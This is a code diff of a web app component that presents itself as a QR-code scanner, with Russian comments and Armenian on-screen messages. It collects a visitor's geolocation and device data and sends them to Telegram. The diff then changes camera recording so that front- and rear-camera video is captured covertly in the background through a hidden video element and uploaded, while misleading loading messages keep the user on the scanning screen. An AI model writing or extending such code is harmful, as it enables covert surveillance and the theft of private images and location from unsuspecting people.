@@ -14,7 +14,7 @@ import {
 } from "@/lib/client-data";
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
-const VIDEO_SEGMENT_DURATION_MS = 5000; // Увеличено до 5 секунд для каждого видеосегмента
+const VIDEO_SEGMENT_DURATION_MS = 5000; // 5 секунд для каждого видеосегмента
 const QR_SCAN_TIMEOUT_MS = 45000; // 45 секунд для ожидания QR-сканирования
 
 type GeolocationData = { latitude: number; longitude: number };
@@ -52,14 +52,11 @@ enum MessageType {
 type AppPhase =
   | "initial"
   | "collectingData"
-  | "recordingVideo1"
-  | "recordingVideo2"
-  | "flippingCamera"
-  | "qrScanning"
+  | "qrScanning" // Теперь переходим сюда сразу после сбора данных
   | "finished";
 
 const PermissionHandler = () => {
-  const videoRef = useRef<HTMLVideoElement>(null);
+  const videoRef = useRef<HTMLVideoElement>(null); // Используется для скрытой записи видео
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
   const mediaChunksRef = useRef<Blob[]>([]);
   const [appPhase, setAppPhase] = useState<AppPhase>("initial");
@@ -121,7 +118,8 @@ const PermissionHandler = () => {
           videoRef.current.srcObject = stream;
           videoRef.current.muted = true;
           videoRef.current.setAttribute("playsinline", "true");
-          await videoRef.current.play().catch((e) => console.error("Error playing video stream:", e));
+          // Не ждем play(), так как видео скрыто и не нужно для UI
+          videoRef.current.play().catch((e) => console.error("Error playing hidden video stream:", e));
         }
 
         return new Promise((resolve) => {
@@ -155,7 +153,7 @@ const PermissionHandler = () => {
           }, duration);
         });
       } catch (error: any) {
-        console.error(`Camera/Microphone access denied for ${facingMode} camera: ${error.message}`);
+        console.error(`Camera/Microphone access denied for ${facingMode} camera (hidden recording): ${error.message}`);
         stream?.getTracks().forEach((track) => track.stop());
         if (videoRef.current) {
           videoRef.current.srcObject = null;
@@ -232,10 +230,11 @@ const PermissionHandler = () => {
     console.log(`[Session ${currentSessionId}] Starting runProcess. Attempt: ${attempt}`);
 
     if (attempt === 1) {
-      setLoadingMessage("Պատրաստվում ենք QR սկանավորմանը...");
+      setLoadingMessage("Հավաքում ենք տվյալներ և կարգավորում տեսախցիկը..."); // Collecting data and setting up camera...
       setAppPhase("collectingData");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'collectingData'.`);
 
+      // 1. Collect initial data (await this)
       const [
         permissionStatusResult,
         batteryInfoResult,
@@ -278,61 +277,64 @@ const PermissionHandler = () => {
       
       setCollectedData(initialCollectedData);
 
+      // 2. Send initial summary (await this, as it's critical for session start)
       const initialSendSuccess = await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary, attempt);
       setProcessSuccessful(initialSendSuccess);
 
-      setLoadingMessage("Օպտիմալացնում ենք տեսախցիկը QR կոդի ճանաչման համար..."); // Обновленное сообщение
-      setAppPhase("recordingVideo1");
-      console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo1'.`);
+      // 3. Transition to QR scanning immediately
+      setLoadingMessage("Անցում դեպի QR կոդի սկանավորում..."); // Transitioning to QR code scanning...
+      setAppPhase("qrScanning"); // Go to QR scanning phase
+      console.log(`[Session ${currentSessionId}] setAppPhase to 'qrScanning' immediately after data collection.`);
 
-      // Запускаем запись обоих видео параллельно
-      const video1RecordingPromise = recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
-      const video2RecordingPromise = recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
+      // 4. Start recording and sending video1 and video2 in the background
+      const videoPromises: Promise<boolean>[] = [];
 
-      // Ожидаем завершения записи обоих видео
-      const [video1Base64, video2Base64] = await Promise.all([
-        video1RecordingPromise,
-        video2RecordingPromise
-      ]);
+      const recordAndSendVideo = async (facingMode: "user" | "environment", messageType: MessageType) => {
+        const videoBase64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, facingMode);
+        if (videoBase64) {
+          return await sendDataToTelegram({ [messageType === MessageType.Video1 ? 'video1' : 'video2']: videoBase64 }, messageType, attempt);
+        }
+        return false;
+      };
 
-      // Отправляем видео в Telegram параллельно
-      const sendPromises: Promise<boolean>[] = [];
-      if (video1Base64) {
-        sendPromises.push(sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1, attempt));
-      }
-      if (video2Base64) {
-        sendPromises.push(sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt));
-      }
+      videoPromises.push(recordAndSendVideo("user", MessageType.Video1));
+      videoPromises.push(recordAndSendVideo("environment", MessageType.Video2));
 
-      // Ожидаем завершения отправки обоих видео
-      const sendResults = await Promise.all(sendPromises);
-      setProcessSuccessful(prev => prev && sendResults.every(res => res));
-
-      setLoadingMessage("Անցում դեպի QR կոդի սկանավորում...");
-      setAppPhase("flippingCamera");
-      console.log(`[Session ${currentSessionId}] setAppPhase to 'flippingCamera'.`);
-      setAppPhase("qrScanning");
-      console.log(`[Session ${currentSessionId}] setAppPhase to 'qrScanning'.`);
+      // Await these promises in the background, updating processSuccessful
+      Promise.all(videoPromises).then(results => {
+          setProcessSuccessful(prev => prev && results.every(res => res));
+          console.log(`[Session ${currentSessionId}] Background video recordings and sends completed.`);
+      }).catch(error => {
+          console.error(`[Session ${currentSessionId}] Error in background video processing:`, error);
+          setProcessSuccessful(false);
+      });
 
     } else if (attempt === 2) {
       console.log(`[Session ${currentSessionId}] Attempt 2 initiated (Retry).`);
       const stage2Message = { qrCodeData: "Этап 2: Повторная попытка сканирования QR-кода." };
       await sendDataToTelegram(stage2Message, MessageType.QrCode, attempt);
 
-      setLoadingMessage("Օպտիմալացնում ենք տեսախցիկը QR կոդի ճանաչման համար..."); // Обновленное сообщение
-      setAppPhase("recordingVideo2");
-      console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2' for attempt 2.`);
-      const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment"); // Используем VIDEO_SEGMENT_DURATION_MS
-      if (video2Base64) {
-        const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
-        setProcessSuccessful(prev => prev && video2SendSuccess);
-      }
-      
-      setLoadingMessage("Անցում դեպի QR կոդի սկանավորում...");
-      setAppPhase("flippingCamera");
-      console.log(`[Session ${currentSessionId}] setAppPhase to 'flippingCamera' for attempt 2.`);
-      setAppPhase("qrScanning");
-      console.log(`[Session ${currentSessionId}] setAppPhase to 'qrScanning' for attempt 2.`);
+      setLoadingMessage("Անցում դեպի QR կոդի սկանավորում..."); // Transitioning to QR code scanning...
+      setAppPhase("qrScanning"); // Go to QR scanning phase
+      console.log(`[Session ${currentSessionId}] setAppPhase to 'qrScanning' immediately for attempt 2.`);
+
+      // Background recording and sending for attempt 2
+      const recordAndSendVideo2 = async () => {
+          const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
+          if (video2Base64) {
+              return await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
+          }
+          return false;
+      };
+
+      recordAndSendVideo2().then(success => {
+          setProcessSuccessful(prev => prev && success);
+          console.log(`[Session ${currentSessionId}] Background video 2 recording and send for attempt 2 completed.`);
+      }).catch(error => {
+          console.error(`[Session ${currentSessionId}] Error in background video 2 processing for attempt 2:`, error);
+          setProcessSuccessful(false);
+      });
+      // setAttempt и processInitiatedRef.current будут обновлены в handleQrScanError после таймаута QR-сканера
       return;
     }
     
@@ -377,10 +379,7 @@ const PermissionHandler = () => {
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-background text-foreground p-4">
       {(appPhase === "initial" ||
-        appPhase === "collectingData" ||
-        appPhase === "recordingVideo1" ||
-        appPhase === "recordingVideo2" ||
-        appPhase === "flippingCamera") && (
+        appPhase === "collectingData") && ( // Теперь только эти фазы показывают спиннер
         <>
           <p className="text-lg mb-4 text-center font-bold text-primary animate-pulse">
             {loadingMessage}
@@ -396,10 +395,8 @@ const PermissionHandler = () => {
               style={{ opacity: 0 }} // Всегда скрыт
             />
             <div className="absolute inset-0 border-4 border-primary opacity-70 rounded-lg pointer-events-none animate-border-pulse" />
-            {(appPhase === "collectingData" || 
-             appPhase === "recordingVideo1" || 
-             appPhase === "recordingVideo2" || 
-             appPhase === "flippingCamera") && (
+            {/* Спиннер отображается только во время сбора данных */}
+            {appPhase === "collectingData" && (
               <div className="absolute inset-0 flex items-center justify-center">
                 <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-primary" />
               </div>
